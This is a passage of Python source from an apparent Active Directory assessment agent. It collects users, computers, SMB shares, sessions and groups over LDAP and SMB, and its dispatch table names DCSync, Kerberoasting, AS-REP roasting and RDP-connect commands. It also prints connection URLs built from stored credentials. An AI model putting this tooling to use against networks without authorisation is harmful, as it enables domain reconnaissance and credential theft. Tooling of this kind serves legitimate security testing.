						reply.smartcard = int(msg.data.UAC_SMARTCARD_REQUIRED)
						reply.active = int(msg.data.canLogon)
						reply.description = msg.data.description
						reply.is_admin = int(msg.data.adminCount) if msg.data.adminCount is not None else None
						
						await out_q.put(reply)
						#await self.websocket.send(reply.to_json())
					
					elif msg.type == GathererProgressType.MACHINE:
						machine_sids_testing.append(msg.data.objectSid)
						reply = NestOpComputerRes()
						reply.token = cmd.token
						reply.name = msg.data.sAMAccountName
						reply.adid = msg.data.ad_id
						reply.sid = msg.data.objectSid
						reply.domainname = msg.data.dNSHostName
						reply.osver = msg.data.operatingSystem
						reply.ostype = msg.data.operatingSystemVersion
						reply.description = msg.data.description
						if msg.data.UAC_SERVER_TRUST_ACCOUNT is True:
							reply.computertype = 'DOMAIN_CONTROLLER'
						elif msg.data.operatingSystem is not None:
							if msg.data.operatingSystem.lower().find('windows') != -1:
								if msg.data.operatingSystem.lower().find('server') != -1:
									reply.computertype = 'SERVER'
								else:
									reply.computertype = 'WORKSTATION'
							else:
								reply.computertype = 'NIX'
						else:
							reply.computertype = 'DUNNO'
						
						await out_q.put(reply)
						#await self.websocket.send(reply.to_json())
					
					elif msg.type == GathererProgressType.SMBLOCALGROUP:
						reply = NestOpSMBLocalGroupRes()
						reply.token = cmd.token
						reply.adid = msg.data.ad_id
						reply.machinesid = msg.data.machine_sid
						reply.usersid = msg.data.sid
						reply.groupname = msg.data.groupname
						#await self.websocket.send(reply.to_json())
						await out_q.put(reply)
					
					elif msg.type == GathererProgressType.SMBSHARE:
						reply = NestOpSMBShareRes()
						reply.token = cmd.token
						reply.adid = msg.data.ad_id
						reply.machinesid = msg.data.machine_sid
						reply.netname = msg.data.netname
						#await self.websocket.send(reply.to_json())
						await out_q.put(reply)
					
					elif msg.type == GathererProgressType.SMBSESSION:					
						reply = NestOpSMBSessionRes()
						reply.token = cmd.token
						reply.adid = msg.data.ad_id
						reply.machinesid = msg.data.machine_sid
						reply.username = msg.data.username
						await out_q.put(reply)
						#await self.websocket.send(reply.to_json())
					
					elif msg.type == GathererProgressType.GROUP:					
						reply = NestOpGroupRes()
						reply.token = cmd.token
						reply.adid = msg.data.ad_id
						reply.name = msg.data.sAMAccountName
						reply.dn = msg.data.dn
						reply.guid = msg.data.objectGUID
						reply.sid = msg.data.objectSid
						reply.description = msg.data.description
						#await self.websocket.send(reply.to_json())
						await out_q.put(reply)
						
				except asyncio.CancelledError:
					return
				except Exception as e:
					logger.exception('resmon processing error!')
					#await self.send_error(cmd, str(e))
		
			
		except asyncio.CancelledError:
			return
		except Exception as e:
			print('resmon died! %s' % e)
			await out_q.put(NestOpErr(cmd.token, str(e)))

	async def do_gather(self, operator:NestOperator, cmd:NestOpGather, out_q, op_in_q):	
		try:
			progress_queue = asyncio.Queue()
			gatheringmonitor_task = asyncio.create_task(self.__gathermonitor(operator, cmd, progress_queue, out_q))
			
			if cmd.ldap_creds is None:
				if platform.system().lower() == 'windows':
					raise Exception('Not implemented!')
					from winacl.functions.highlevel import get_logon_info
					logon = get_logon_info()
					
					ldap_url = 'ldap+sspi-ntlm://%s\\%s:jackdaw@%s' % (logon['domain'], logon['username'], logon['logonserver'])
			
				else:
					raise Exception('ldap auto mode selected, but it is not supported on this platform')
			else:
				ldaptarget = self.get_target_address_db(cmd.ldap_target, CONNECTIONPROTO.LDAP)
				ldapcred, err = self.get_stored_cred_db(cmd.ldap_creds, CONNECTIONPROTO.LDAP, target=ldaptarget)
				if err is not None:
					raise err

				ldap_url = MSLDAPURLDecoder(None, ldapcred, ldaptarget)
				
				#ldap_url.ldap_scheme = ldaptarget.proto
				#ldap_url.auth_scheme = ldapcred.auth_method
				#
				#ldap_url.domain = ldapcred.domain
				#ldap_url.username = ldapcred.username
				#ldap_url.password = ldapcred.password
				#ldap_url.encrypt = ldapcred.encrypt
				#ldap_url.auth_settings = ldapcred.settings
				#ldap_url.etypes = ldapcred.etypes
				#
				#ldap_url.ldap_host = ldaptarget.host
				#ldap_url.ldap_port = ldaptarget.port
				#ldap_url.ldap_tree = ldaptarget.tree
				#ldap_url.target_timeout = ldaptarget.timeout
				#ldap_url.target_pagesize = ldaptarget.ldap_query_page_size
				#ldap_url.target_ratelimit = ldaptarget.ldap_query_ratelimit
				#ldap_url.dc_ip = ldaptarget.dc_ip
				#ldap_url.serverip = ldaptarget.serverip
				#ldap_url.proxy = ldaptarget.proxy

			
			if cmd.smb_creds is None:
				if platform.system().lower() == 'windows':
					from winacl.functions.highlevel import get_logon_info
					logon = get_logon_info()
					smb_url = 'smb2+sspi-ntlm://%s\\%s:jackdaw@%s' % (logon['domain'], logon['username'], logon['logonserver'])
			
				else:
					raise Exception('smb auto mode selected, but it is not supported on this platform')
			else:
				smbtarget = self.get_target_address_db(cmd.smb_target, CONNECTIONPROTO.SMB)
				smbcredential, err = self.get_stored_cred_db(cmd.smb_creds, CONNECTIONPROTO.SMB, target=smbtarget)
				if err is not None:
					raise err
				
				smb_url = SMBConnectionURL(None, smbcredential, smbtarget)
			
			kerberos_url = None
			if cmd.kerberos_creds is None:
				kerberos_url = None
			else:
				kerbtarget = self.get_target_address_db(cmd.kerberos_target, CONNECTIONPROTO.KERBEROS)
				kerbcred, err = self.get_stored_cred_db(cmd.kerberos_creds, CONNECTIONPROTO.KERBEROS, target=kerbtarget)
				if err is not None:
					print('TODO: Kerberos error! %s' % err)
					#raise err
				
				else:
					kerberos_url = KerberosClientURL()
					kerberos_url.domain = kerbcred.domain
					kerberos_url.username = kerbcred.username
					kerberos_url.secret_type = KerberosSecretType.PASSWORD #TODO!
					kerberos_url.secret = kerbcred.password
					kerberos_url.dc_ip = None
					kerberos_url.protocol = kerbtarget.protocol
					kerberos_url.timeout = kerbtarget.timeout
					kerberos_url.port = kerbtarget.port
					kerberos_url.proxy = kerbtarget.proxy

			dns = None
			if cmd.dns is not None:
				dns = self.get_target_address_db(cmd.dns, CONNECTIONPROTO.DNS)
			print(ldap_url)
			print(smb_url)
			print(dns)
			with multiprocessing.Pool() as mp_pool:
				gatherer = Gatherer(
					self.db_session,
					self.work_dir,
					ldap_url, 
					smb_url,
					kerb_url=kerberos_url,
					ldap_worker_cnt=int(cmd.ldap_workers), 
					smb_worker_cnt=int(cmd.smb_worker_cnt), 
					mp_pool=mp_pool, 
					smb_gather_types=['all'], 
					progress_queue=progress_queue, 
					show_progress=self.show_progress,
					calc_edges=True,
					ad_id=None,
					dns=dns,
					stream_data=cmd.stream_data
				)
				res, err = await gatherer.run()
				if err is not None:
					print('gatherer returned error')
					await out_q.put(NestOpErr(cmd.token, str(err)))
					return
				
				#####testing
				await asyncio.sleep(20)
				#######
				
				await out_q.put(NestOpOK(cmd.token))
		except Exception as e:
			logger.exception('do_gather')
			await out_q.put(NestOpErr(cmd.token, str(e)))
		
		finally:
			if gatheringmonitor_task is not None:
				gatheringmonitor_task.cancel()
			progress_queue = None

	async def __handle_commands(self):
		try:
			while True:
				try:
					# op_in_q is for certain command only which take further inputs from the operator (eg. rdpconnect)
					operator, cmd, out_q, op_in_q = await self.cmd_in_q.get()
					if cmd.cmd in self.__cmd_dispatch_table:
						x = asyncio.create_task(self.__cmd_dispatch_table[cmd.cmd](operator, cmd, out_q, op_in_q))
					else:
						raise Exception('Agent got unrecognized command')
				except Exception as e:
					await out_q.put(NestOpErr(cmd.token, str(e)))

		except Exception as e:
			traceback.print_exc()
	
	async def run(self):
		self.cmd_in_q = asyncio.Queue()
		self.__cmd_dispatch_table = {
			NestOpCmd.GATHER : self.do_gather,
			NestOpCmd.SMBFILES : self.do_smbfiles,
			NestOpCmd.SMBSESSIONS : self.do_smbsessions,
			NestOpCmd.SMBDCSYNC : self.do_smbdcsync,
			NestOpCmd.KERBEROAST : self.do_kerberoast,
			NestOpCmd.ASREPROAST : self.do_asreproast,
			NestOpCmd.KERBEROSTGS : self.do_gettgs,
			NestOpCmd.KERBEROSTGT : self.do_gettgt,
			NestOpCmd.RDPCONNECT : self.do_rdpconnect,
			NestOpCmd.LDAPSPNS : self.do_ldapspns,

		}

		self.command_task = asyncio.create_task(self.__handle_commands())
		await asyncio.sleep(0)
		return